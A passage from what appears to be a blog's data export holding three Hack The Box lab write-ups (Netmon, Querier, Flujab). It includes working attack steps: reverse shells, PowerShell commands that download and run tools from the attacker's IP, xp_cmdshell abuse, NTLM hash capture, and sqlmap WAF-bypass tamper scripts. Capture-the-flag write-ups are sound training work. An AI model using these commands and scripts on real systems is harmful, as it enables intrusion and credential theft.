    "content": "I think Netmon had the quickest first blood on HTB yet. The user flag could be grabbed by just using anonymous FTP and retrieving it from the user directory. I guessed the PRTG admin password after finding an old backup file and changing the year in the password from 2018 to 2019. Once inside PRTG, I got RCE as SYSTEM by creating a sensor and using Nishang’s reverse shell oneliner.Summary  We can log in with anonymous FTP and get the user.txt flag directly from the Public user folder  There’s a PRTG configuration backup containing an old password that we can download from FTP  The PRTG password is the almost the same as the one found in the old backup but it ends with 2019 instead of 2018  We can get RCE using Powershell scripts running as sensors in PRTGDetailed stepsNmap scanThe nmap scan shows that anonymous FTP is allowed and that PRTG is running on the webserver.# nmap -sC -sV -F 10.10.10.152Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-02 22:43 ESTNmap scan report for netmon.htb (10.10.10.152)Host is up (0.0090s latency).Not shown: 95 closed portsPORT    STATE SERVICE      VERSION21/tcp  open  ftp          Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)| 02-02-19  11:18PM                 1024 .rnd| 02-25-19  09:15PM       &lt;DIR&gt;          inetpub| 07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs| 02-25-19  09:56PM       &lt;DIR&gt;          Program Files| 02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)| 02-03-19  07:08AM       &lt;DIR&gt;          Users|_02-25-19  10:49PM       &lt;DIR&gt;          Windows| ftp-syst: |_  SYST: Windows_NT80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)|_http-server-header: PRTG/18.1.37.13946| http-title: Welcome | PRTG Network Monitor (NETMON)|_Requested resource was /index.htm|_http-trane-info: Problem with XML parsing of /evox/about135/tcp open  msrpc        Microsoft Windows RPC139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-dsService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsFree flag from FTPIn the nmap scan, the script identified that the FTP server allows anonymous access. Because we’re not constrained to ftproot and we can look around the entire disk of the box, I quickly found a user.txt flag in the c:\\users\\public folder.# ftp 10.10.10.152Connected to 10.10.10.152.220 Microsoft FTP ServiceName (10.10.10.152:root): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password:230 User logged in.Remote system type is Windows_NT.ftp&gt; cd /users/public250 CWD command successful.ftp&gt; dir200 PORT command successful.125 Data connection already open; Transfer starting.02-03-19  07:05AM       &lt;DIR&gt;          Documents07-16-16  08:18AM       &lt;DIR&gt;          Downloads07-16-16  08:18AM       &lt;DIR&gt;          Music07-16-16  08:18AM       &lt;DIR&gt;          Pictures02-02-19  11:35PM                   33 user.txt07-16-16  08:18AM       &lt;DIR&gt;          Videos226 Transfer complete.ftp&gt; type binary200 Type set to I.ftp&gt; get user.txtlocal: user.txt remote: user.txt200 PORT command successful.125 Data connection already open; Transfer starting.226 Transfer complete.33 bytes received in 0.01 secs (4.5173 kB/s)ftp&gt; exit221 Goodbye.root@ragingunicorn:~/htb/netmon# cat user.txtdd58c...I was too slow for first blood, someone else on HTB got user blood in under 2 minutes.Getting access to PRTGThe PRTG application is running on port 80:I tried the default credentials prtgadmin / prtgadmin but I got access denied.Looking in the filesystem, I found that the configuration directory for PRTG is under c:\\programdata\\paessler.ftp&gt; cd /programdata250 CWD command successful.ftp&gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.02-02-19  11:15PM       &lt;DIR&gt;          Licenses11-20-16  09:36PM       &lt;DIR&gt;          Microsoft02-02-19  11:18PM       &lt;DIR&gt;          PaesslerI found the configuration file and an old configuration from last year.ftp&gt; cd \"PRTG Network Monitor\"250 CWD command successful.ftp&gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.[...]02-25-19  09:54PM              1189697 PRTG Configuration.dat03-02-19  05:33PM              1198465 PRTG Configuration.old07-14-18  02:13AM              1153755 PRTG Configuration.old.bakThe PRTG Configuration.dat config file contains the credentials for user prtgadmin but they are encrypted (or hashed?) with what seems to be a proprietary method.When I checked PRTG Configuration.old.bak, I found the dbpassword: PrTg@dmin2018I tried this password with user prtgadmin on the PRTG login page but it didn’t work. Then I realized that this is from a 2018 backup, maybe the admin is lazy and re-used the dbpassword for the admin account and simply used the current date (2019).My guess was correct and I was able to log in with password PrTg@dmin2019RCE through PRTG sensorsPRTG is a monitoring tool that supports a whole suite of sensors, like ping, http, snmp, etc. The server itself has been added in the device list, so it’s safe to assume we can add sensors to it:I clicked add sensor on the 10.10.10.152 server then selected EXE/Script sensor.We can’t add powershell custom scripts because we don’t have write access to the application directory, but we can leverage the Parameters field to add additional code at the end of an existing Powershell script. I used Nishang to get a reverse shell. I added a semi colon at the beginning of the parameters, then pasted the Nishang code after.After the sensor is created, we hit the play button to execute it.And we get a shell as nt authority\\system. Box done!# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.152] 55751PS C:\\Windows\\system32&gt; whoamint authority\\systemPS C:\\Windows\\system32&gt; type c:\\users\\administrator\\desktop\\root.txt30189..."
  },
  
  {
    "title": "Querier - Hack The Box",
    "url": "/posts/htb-writeup-querier/",
    "categories": "hackthebox, infosec",
    "tags": "windows, hardcoded credentials, mssql, gpp, winrm, impacket, responder",
    "date": "2019-06-22 00:00:00 +0800",
    





    
    "snippet": "To solve Querier, we find an Excel spreadsheet that contains a VBA macro then use Responder to capture NTLM hashes from the server by forcing it to connect back to our machine with xp_dirtree. Afte...",
    "content": "To solve Querier, we find an Excel spreadsheet that contains a VBA macro then use Responder to capture NTLM hashes from the server by forcing it to connect back to our machine with xp_dirtree. After cracking the hash, we gain RCE on the server by using the standard xp_cmdshell command. The Administator credentials are found in a Group Policy Preference file.Summary  An SMB share contains a binary file with hardcoded MSSQL credentials  We can log in to MSSQL and get the mssql-svc user hash using xp_dirtree and responder  Logging in as mssql-svc to MSSQL we can use xp_cmdshell to get RCE  Using PowerUp, we find the administrator password in a GPP xml fileDetailed stepsPort scan shows SMB is open, along with MSSQL and WinRM.# nmap -sC -sV -p- 10.10.10.125 -oA querierStarting Nmap 7.70 ( https://nmap.org ) at 2019-02-16 00:56 ESTNmap scan report for querier.htb (10.10.10.125)Host is up (0.013s latency).Not shown: 65521 closed portsPORT      STATE SERVICE       VERSION135/tcp   open  msrpc         Microsoft Windows RPC139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds?1433/tcp  open  ms-sql-s      Microsoft SQL Server  14.00.1000.00| ms-sql-ntlm-info:|   Target_Name: HTB|   NetBIOS_Domain_Name: HTB|   NetBIOS_Computer_Name: QUERIER|   DNS_Domain_Name: HTB.LOCAL|   DNS_Computer_Name: QUERIER.HTB.LOCAL|   DNS_Tree_Name: HTB.LOCAL|_  Product_Version: 10.0.17763| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2019-02-16T18:52:53|_Not valid after:  2049-02-16T18:52:53|_ssl-date: 2019-02-16T18:54:24+00:00; +12h57m10s from scanner time.5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open  msrpc         Microsoft Windows RPC49665/tcp open  msrpc         Microsoft Windows RPC49666/tcp open  msrpc         Microsoft Windows RPC49667/tcp open  msrpc         Microsoft Windows RPC49668/tcp open  msrpc         Microsoft Windows RPC49669/tcp open  msrpc         Microsoft Windows RPC49670/tcp open  msrpc         Microsoft Windows RPC49671/tcp open  msrpc         Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 12h57m10s, deviation: 0s, median: 12h57m09s| ms-sql-info:|   10.10.10.125:1433:|     Version:|       name: Microsoft SQL Server|       number: 14.00.1000.00|       Product: Microsoft SQL Server|_    TCP port: 1433| smb2-security-mode:|   2.02:|_    Message signing enabled but not required| smb2-time:|   date: 2019-02-16 13:54:23|_  start_date: N/ASMB share enumerationThe share enumeration didn’t work reliably when I first did the box. For some reason I would get random connection timeouts. I had to try the enumeration a few times, I don’t know why though.# smbmap -u invalid -H 10.10.10.125[+] Finding open SMB ports....[+] Guest SMB session established on 10.10.10.125...[+] IP: 10.10.10.125:445\tName: querier.htb\tDisk                                                  \tPermissions\t----                                                  \t-----------\tADMIN$                                            \tNO ACCESS\tC$                                                \tNO ACCESS\tIPC$                                              \tREAD ONLY\tReports                                           \tREAD ONLYThere a Reports share that our user has read access to. I logged on using smbclient and downloaded the file.# smbclient -U QUERIER/invalid //10.10.10.125/ReportsEnter QUERIER\\invalid's password:Try \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Mon Jan 28 18:23:48 2019  ..                                  D        0  Mon Jan 28 18:23:48 2019  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019\t\t6469119 blocks of size 4096. 1572541 blocks availablesmb: \\&gt; get \"Currency Volume Report.xlsm\"getting file \\Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (124.4 KiloBytes/sec) (average 124.4 KiloBytes/sec)The 2007+ Microsoft Office format is basically a zip compressed file. We can see the contents of that Macro file without using LibreOffice with:# file 'Currency Volume Report.xlsm'Currency Volume Report.xlsm: Microsoft Excel 2007+# unzip 'Currency Volume Report.xlsm'Archive:  Currency Volume Report.xlsm  inflating: [Content_Types].xml  inflating: _rels/.rels  inflating: xl/workbook.xml  inflating: xl/_rels/workbook.xml.rels  inflating: xl/worksheets/sheet1.xml  inflating: xl/theme/theme1.xml  inflating: xl/styles.xml  inflating: xl/vbaProject.bin  inflating: docProps/core.xml  inflating: docProps/app.xmlI checked out all the files and eventually found a connection string inside the vbaProject.bin binary file:# strings vbaProject.bin macro to pull data for client volume reportsn.Conn]Openrver=&lt;SELECT * FROM volume;word&gt; MsgBox \"connection successful\"Set rs = conn.Execute(\"SELECT * @@version;\")Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6So it seems that the username and password for the MSSQL server have been hardcoded into the macro. We can also see this by opening the file in LibreOffice and checking out the macros:  Username: reporting  Password: PcwTWTHRwryjc$c6Getting RCE through MSSQLI used the Impacket mssqlclient.py to connect to the database:# /usr/share/doc/python-impacket/examples/mssqlclient.py -windows-auth querier/reporting@querier.htbImpacket v0.9.17 - Copyright 2002-2018 Core Security TechnologiesPassword:[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.[*] INFO(QUERIER): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)[!] Press help for extra shell commandsSQL&gt;The first thing I tried was to use xp_cmdshell to run commands but the current user doesn’t have enough privileges:SQL&gt; xp_cmdshell \"whoami\";[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.SQL&gt; EXEC sp_configure 'show advanced options', 1;[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.SQL&gt; RECONFIGURE;[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.However, we can trigger an SMB connection back to us with xp_dirtree and steal the NTLMv2 hash from the server using Responder:SQL&gt; xp_dirtree \"\\\\10.10.14.23\\gimmesomehashes\"The account is using a weak password that we can crack with the rockyou.txt wordlist:# john -w=/usr/share/wordlists/rockyou.txt --fork=4 hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Node numbers 1-4 of 4 (fork)Press 'q' or Ctrl-C to abort, almost any other key for statuscorporate568     (mssql-svc)1 0g 0:00:00:06 DONE (2019-02-17 19:17) 0g/s 428905p/s 428905c/s 428905C/s CHIKITITA13 0g 0:00:00:06 DONE (2019-02-17 19:17) 0g/s 406211p/s 406211c/s 406211C/s Pippa18622 0g 0:00:00:06 DONE (2019-02-17 19:17) 0g/s 421156p/s 421156c/s 421156C/s HIKID254 1g 0:00:00:06 DONE (2019-02-17 19:17) 0.1515g/s 339332p/s 339332c/s 339332C/s corporate568Waiting for 3 children to terminateUse the \"--show\" option to display all of the cracked passwords reliablySession completedThe password is: corporate568Now we can log in with that the mssql-svc account then enable xp_cmdshell and get RCE:# /usr/share/doc/python-impacket/examples/mssqlclient.py -windows-auth querier/mssql-svc@querier.htbImpacket v0.9.17 - Copyright 2002-2018 Core Security TechnologiesPassword:[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(QUERIER): Line 1: Changed database context to 'master'.[*] INFO(QUERIER): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)[!] Press help for extra shell commandsSQL&gt; EXEC sp_configure 'show advanced options', 1;[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.SQL&gt; RECONFIGURE;SQL&gt; EXEC sp_configure 'xp_cmdshell', 1;[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.SQL&gt; RECONFIGURE;SQL&gt; xp_cmdshell \"dir c:\\users\"output-------------------------------------------------------------------------------- Volume in drive C has no label. Volume Serial Number is FE98-F373NULL Directory of c:\\usersNULL01/28/2019  11:41 PM    &lt;DIR&gt;          .01/28/2019  11:41 PM    &lt;DIR&gt;          ..01/28/2019  10:17 PM    &lt;DIR&gt;          Administrator01/28/2019  11:42 PM    &lt;DIR&gt;          mssql-svc01/28/2019  10:17 PM    &lt;DIR&gt;          Public               0 File(s)              0 bytes               5 Dir(s)   6,438,649,856 bytes freeNULLAt first I tried running a Nishang reverse shell but Windows Defender caught it. Then I tried downloading netcat with certutil.exe but that also was caught. So I used powershell instead to download netcat and then spawn a shell:SQL&gt; xp_cmdshell \"powershell -command Invoke-WebRequest -Uri http://10.10.14.23/nc.exe -OutFile c:\\programdata\\nc.exe\"# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.125] 49713Microsoft Windows [Version 10.0.17763.292](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamiquerier\\mssql-svcC:\\Windows\\system32&gt;type c:\\users\\mssql-svc\\desktop\\user.txttype c:\\users\\mssql-svc\\desktop\\user.txtc37b41b...PrivescI used Powersploit’s PowerUp module to do some recon on the box and found the administrator credentials stored in the Group Policy Preference (GPP) xml file. As explained on many other blogs, that file is AES encrypted but the key was leaked on MSDN a couple of years ago so PowerUp is able to decrypt it automatically.C:\\Windows\\system32&gt;powershellPS C:\\Windows\\system32&gt; IEX (New-Object Net.Webclient).downloadstring(\"http://10.10.14.23/PowerUp.ps1\")PS C:\\Windows\\system32&gt; invoke-allchecks[*] Checking for cached Group Policy Preferences .xml files....Changed   : {2019-01-28 23:12:48}UserNames : {Administrator}NewName   : [BLANK]Passwords : {MyUnclesAreMarioAndLuigi!!1!}File      : C:\\ProgramData\\Microsoft\\Group            Policy\\History\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xml            C:\\Windows\\system32&gt;powershellPassword: MyUnclesAreMarioAndLuigi!!1!Using Alamot’s WinRM ruby script, I was able to log in as administrator:require 'winrm'# Author: Alamotconn = WinRM::Connection.new(  endpoint: 'http://10.10.10.125:5985/wsman',  user: 'querier\\administrator',  password: 'MyUnclesAreMarioAndLuigi!!1!',)command=\"\"conn.shell(:powershell) do |shell|    until command == \"exit\\n\" do        output = shell.run(\"-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')\")        print(output.output.chomp)        command = gets        output = shell.run(command) do |stdout, stderr|            STDOUT.print stdout            STDERR.print stderr        end    end    puts \"Exiting with code #{output.exitcode}\"end# ruby querier.rbPS querier\\administrator@QUERIER Documents&gt; whoamiquerier\\administratorPS querier\\administrator@QUERIER Documents&gt; type c:\\users\\administrator\\desktop\\root.txtb19c37..."
  },
  
  {
    "title": "Flujab - Hack The Box",
    "url": "/posts/htb-writeup-flujab/",
    "categories": "hackthebox, infosec",
    "tags": "smtp, sqli, enumeration, screen, exploit, waf, tamper script, weak ssh keys",
    "date": "2019-06-15 00:00:00 +0800",
    





    
    "snippet": "Flujab was without a doubt one of the toughest HTB box. It’s got a ton of vhosts that force you to enumerate a lot of things and make sure you don’t get distracted by the quantity of decoys and tro...",
    "content": "Flujab was without a doubt one of the toughest HTB box. It’s got a ton of vhosts that force you to enumerate a lot of things and make sure you don’t get distracted by the quantity of decoys and trolls left around. The key on this box is to stay ‘in scope’ as the box author hinted at before the box was released, so that means enumerating two specific domains without getting distracted by all the other stuff on the box.The hard part of the box is the SQL injection that forces you to exploit it manually or to write your own WAF evasion tamper scripts in SQLmap because the box author hardcoded some string substition in the code to defeat people blindly runnning sqlmap. This box is also rather unique because the output of the SQL queries is not seen on the web page where the query is sent but rather in an email received by SMTP, so we have to use a 2nd order SQL injection option in sqlmap or write custom code to handle this.When I did the box, I initially found the information I was looking for in the database but overlooked at critical column in the table row that contained the next step for getting access to the box. Eventually I found the web administation panel and was able to get access via SSH, using keys generated by Debian’s weak PRNG. This was a vulnerability that I remembered when I did my OSCP.The priv esc was a nice one also, thankfully one of the screen binary seemed out of place a little bit which tipped me off otherwise it would have taken me much longer to find it.Summary  Enumerate all the vhosts (based on the information in the SSL certificate’s SAN), concentrating only on freeflujab.htb  Observe that the page sets a Modus cookie with a path of /?smtp_config  Figure out that the Cookie is just a base64 encoded value of Configure=Null, and that we can change it to a True  Use the SMTP administration panel to set the SMTP server IP to our own IP address  Find that the ?remind, ?cancel, and ?book pages send an email which we can receive by running a local SMTP server on our machine  The webpage code contains a Boolean Blind SQL injection and a Union based SQL injection, both of which can be exploited through the email responses  There is a WAF in place that will block certain SQL keywords like CASE, 0x and ALL so we need to use tamper scripts to bypass that  After dumping the vaccinations database, we find an entry in the admin table containing the administration panel URL  We can log in to the web admin panel using the credentials found in the database, then we have read access to files on the filesystem  There is a user drno which has an authorized_keys file in his folder, and there is a note in /etc/ssh/deprecated_keys that mentions old weak keys  This leads to one of Debian’s old vulnerability where a weak PRNG can be exploited for recovering private keys based on the public key’s signature  After recovering the private key, log in as drno then eventually find the screen version running is vulnerable to a local privilege escalationTools/Blogs used  https://github.com/g0tmi1k/debian-ssh  https://www.exploit-db.com/exploits/41154Detailed stepsPort scanStarting with the usual portscan, we only find a handful of ports open on this machine: 22, 80, 443 and 8080.# nmap -p- -sC -sV 10.10.10.124Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-29 22:20 ESTNmap scan report for clownware.htb (10.10.10.124)Host is up (0.019s latency).Not shown: 65531 closed portsPORT     STATE SERVICE  VERSION22/tcp   open  ssh?80/tcp   open  http     nginx|_http-server-header: ClownWare Proxy|_http-title: Did not follow redirect to https://clownware.htb/443/tcp  open  ssl/http nginx|_http-server-header: ClownWare Proxy|_http-title: Direct IP access not allowed | ClownWare|_http-trane-info: Problem with XML parsing of /evox/about| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb| Not valid before: 2018-11-28T14:57:03|_Not valid after:  2023-11-27T14:57:03|_ssl-date: TLS randomness does not represent time| tls-alpn: |_  http/1.1| tls-nextprotoneg: |_  http/1.18080/tcp open  ssl/http nginx|_http-server-header: ClownWare Proxy|_http-title: Direct IP access not allowed | ClownWare| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb| Not valid before: 2018-11-28T14:57:03|_Not valid after:  2023-11-27T14:57:03|_ssl-date: TLS randomness does not represent time| tls-alpn: |_  http/1.1| tls-nextprotoneg: |_  http/1.1The first thing I noticed is the certificate Subject Alternative Name field that contains many different domains and sub-domains. I added those to my local host file so I could enumerate all those vhosts.The other item I noted was the SSH service didn’t respond with a banner. I manually checked and confirmed that even through port 22 is open, there is no response sent back by the server. This would likely indicate either a “fake/troll service” running on this port or perhaps a whitelist wrapper of some sort configured on the port.Web enumerationThis box contains a large amount of vhosts as shown in the certificate SAN:  clownware.htb  sni147831.clownware.htb  proxy.clownware.htb  console.flujab.htb  sys.flujab.htb  smtp.flujab.htb  vaccine4flu.htb  bestmedsupply.htb  custoomercare.megabank.htb  flowerzrus.htb  chocolateriver.htb  meetspinz.htb  rubberlove.htb  freeflujab.htb  flujab.htbThe box creator gave a small public hint in the HTB forums just before the box was released:  The mindset of this box is designed as follows:  Treat it as a box a pentester may be tasked to look at on the real internet.  Think of the box name as a kind of scope.So based on the name of box, I narrowed my search to the flujab.htb and freeflujab.htb domains. But just for sake of completeness, the following section contains the useless websites and trolls I found on the box.Useless websites and trollingbestmedsupply.htbchocolateriver.htbcustoomercare.megabank.htbflowerzrus.htbmeetspinz.htbrubberlove.htbvaccine4flu.htbconsole.flujab.htbNon-functional SMTP websiteThe smtp.flujab.htb website contains a login form, this looks very interesting… Or not as it turns out.I thought there was a SQL injection of some sort on there but I quickly saw that the form doesn’t do anything when you click to sign in. When we look at the code, we can see that it’s badly broken and doesn’t do anything when we submit the form.The api call shown above is missing the closing parantheses, plus other functions are missing such as shown_modal_error(). This whole code is basically useless. I tried fuzzing the site to find a hidden API endpoint but didn’t find any.I found a /README file on the site that confirmed that this site is no longer used:   -------------------------------------   This Service has been decommissioned!   -------------------------------------Administrators can now use the configuration section of the new free service application.Let’s move on to the  freeflujab.htb site.Enumerating the real target websiteThe freeflujab.htb website is an healthcare information site about the Flu where patients can register, book, cancel or send a reminder for appoinments.Registration: ?regThe registration doesn’t work when registering a user, we can an error message about a connection error to the mailserver. The website errors out when it tries to send an email after the registration.Booking: ?bookThe booking page also doesn’t work for us because we don’t have a valid patient name to book an appointment.Cancel: ?cancelWe can’t get to the cancelation page as it redirects us to ?ERROR=NOT_REGISTERED automatically.The next thing I did was check the cookies I had since the registration status must be stored in a session on the server-side or in a client cookie.The content of the Modus and Registered cookies are simply Base64 encoded:  Modus: Q29uZmlndXJlPU51bGw%3D = Configure=Null  Patient: ea879301202391042cd783affa29f92a =  Registered: ZWE4NzkzMDEyMDIzOTEwNDJjZDc4M2FmZmEyOWY5MmE9TnVsbA%3D%3D = ea879301202391042cd783affa29f92a=NullBy changing the Registered cookie to ea879301202391042cd783affa29f92a=True, we are able to access the cancelation page:But we get the same SMTP error message when trying to cancel an appointment:Then I noticed in the cookies that there is a cookie set for the /?smtp_config path. If we try to connect to it, we get redirected to https://freeflujab.htb/?denied. But if we change the Configure=Null cookie value to Configure=True we are able to access the SMTP configuration page.We can’t set the server address to our own IP address:But the validation is performed client-side so we can just use Burp to change the smtp.flujab.htb value for our IP address:There’s also a link to see the whitelisted sysadmins but we get a denied redirection when we click on it. The problem is the Configure=True cookie has been set to the /?smtp_config path. If we change the path of the cookie to / we can access the whitelist page.Changing the SMTP server address adds our IP address automatically to the whitelist. Later this same whitelist is used to allow access to the web administation panel so if the box gets reverted, we need to go back to the SMTP configuration page and change the SMTP server address again otherwise our IP can’t access the admin panel.Remind: ?remindThe last useful link on the page is used to send appointment reminders.Now that we have configured a valid SMTP address, we can send a reminder (we can choose any NHS number, it doesn’t need to exist in the database)… But we get an error message:The form doesn’t contain an email address field, but we can intercept the request with Burp and add it ourselves:We can use the python smtpd module to run an SMTP server in Kali and receive the email:SQL injectionThe email itself doesn’t contain anything useful, so the next step is to fuzz the nhsnum input and look for an SQL injection. Instead of doing it manually through Burp, I made a quick script to speed up the process.#!/usr/bin/pythonimport requestsfrom pwn import *import timewhile True:    cmd = raw_input(\"&gt;\").strip()    headers = {        \"Cookie\": \"Patient=ea879301202391042cd783affa29f92a;Registered=ZWE4NzkzMDEyMDIzOTEwNDJjZDc4M2FmZmEyOWY5MmE9VHJ1ZQ==\",    }    data = {        \"nhsnum\": \"{}\".format(cmd),        \"email\": \"test@test.com\",        \"submit\": \"Send+Reminder\"       }    proxies = {    'http': 'http://127.0.0.1:8080',    'https': 'http://127.0.0.1:8080',    }    before = time.time()    r = requests.post(url=\"https://freeflujab.htb/?remind\", headers=headers, data=data, verify=False, proxies=proxies)    after = time.time()    delta = after-before    print(\"Response time: {}\".format(delta))After fuzzing for a bit, I found a UNION based injection where the Ref: field in the subject header contains the return value from the 3rd column.I wanted to use sqlmap to enumerate the database but I had a problem since sqlmap doesn’t “see” the responses from the queries since they come by email through the SMTP server. So what I did was create a small script to pipe the content of Ref: field in the Subject header to a file in my Apache server root directory:from datetime import datetimeimport asyncoreimport refrom smtpd import SMTPServerclass EmlServer(SMTPServer):    no = 0    def process_message(self, peer, mailfrom, rcpttos, data):        filename = '/var/www/html/test.txt'        f = open(filename, 'w')        buf = data.splitlines()        for line in buf:                # print line             if 'Ref:' in line:                  print line.split('Ref:')[1]                f.write(line.split('Ref:')[1])            f.close        print 'Message %d, %s saved.' % (self.no, filename)        self.no += 1def run():    foo = EmlServer(('10.10.14.23', 25), None)    try:        asyncore.loop()    except KeyboardInterrupt:        passif __name__ == '__main__':    run()Then I used the --second-url option in sqlmap to make it check my local webserver for the query reponse. I added a tamper script first in the chain so it wipes the content of the reponse file, so that if the query errors out on the server it doesn’t cause a false positive.delete.pydef tamper(payload, **kwargs):    retVal = payload    f = open('/var/www/html/test.txt', 'w')    f.write('')    f.close()    sleep(0.5)    return retValI then used the following sqlmap command: sqlmap --threads 1 -r /root/htb/flujab/flujab.req --risk=3 -p nhsnum --random-agent --proxy=http://127.0.0.1:8080 --second-url http://127.0.0.1/test.txt --tamper delete --force-ssl --technique u --union-cols 5 --union-char 1 -vv --suffix \" #\" --dbms=mysql --flush-sessionBut I had problems getting sqlmap working correctly, for some reason even when I gave it the correct number of columns it didn’t find the injection point.Then I remembered that on some of the webpages there was a Protected By ClownWare.htb message at the bottom. So I figured there was a WAF messing with some of the parameters sent to the server.After playing with the queries manually, I found that ALL, 0x and CASE keywords are modified by the server:For the ALL and 0x statements, I used the unionalltounion and 0x2char tamper scripts already included in sqlmap but for CASE I made my own script to replace it with an IF statement:case.pydef tamper(payload, **kwargs):    retVal = payload    if payload:        retVal = retVal.replace(\"CASE WHEN\", \"IF(\")        retVal = retVal.replace(\"THEN 1 ELSE 0 END\", \",1,0)\")    return retValThe final sqlmap command is: sqlmap --threads 1 -r /root/htb/flujab/flujab.req --risk=3 -p nhsnum --random-agent --proxy=http://127.0.0.1:8080 --second-url http://127.0.0.1/test.txt --tamper delete --force-ssl --technique u --union-cols 5 --union-char 1 -vv --suffix \" #\" --dbms=mysql --tamper unionalltounion --tamper 0x2char --tamper caseIt’s not fast but after a few minutes it found the injection point:Now that we have the injection working in sqlmap, I was able to dump the list of databases:[*] information_schema[*] MedStaff[*] mysql[*] openmrs[*] performance_schema[*] phplist[*] vaccinationsThe vaccinations database contains the following tables:+------------------------+| user                   || admin                  || admin_attribute        || admin_password_request || adminattribute         || admintoken             || eventlog               |[...]I dumped the admin table and found some credentials and a vhost that I previously didn’t have: sysadmin-console-01.flujab.htbThe hash was easily cracked with john and rockyou.txt:  sysadm / th3doct0rAccess to the SMTP configuration pageThe admin panel is running the Ajenti application:We can log in with the sysadm credentials we found in the database, and we can use the Notepad tool to read &amp; write files:The /home/drno folder contains two interesting files in the .ssh directory:The userkey file contains an encrypted SSH private key that we can crack with ssh2john / john (password: shadowtroll) but we can’t use it because it doesn’t match the authorized_keys file. authorized_keys contains a hint about whitelisting but other than that it doesn’t seem possible to exploit this since we don’t have the matching private key.# shell whitelisting + key auth enabled ssh-rsa 